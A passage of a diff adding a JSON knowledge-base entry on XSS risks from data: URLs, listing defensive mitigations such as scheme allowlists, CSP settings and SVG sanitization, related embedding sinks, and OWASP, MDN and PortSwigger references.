+        "Allowlist URL schemes to https and relative paths on every navigation and embedding sink",
+        "Set CSP object-src 'none' and exclude data: from script-src, img-src where feasible, and frame-src",
+        "Serve user SVGs as raster or with script-neutralizing sanitization",
+        "Block data: URLs at framework level in router and redirect helpers"
+      ],
+      "related": [
+        "iframe src",
+        "object data",
+        "embed src",
+        "javascript: URL"
+      ],
+      "references": [
+        "OWASP: XSS Filter Evasion Cheat Sheet",
+        "MDN: data URLs",
+        "PortSwigger: DOM XSS"
+      ]
+    }
+  ]
+}
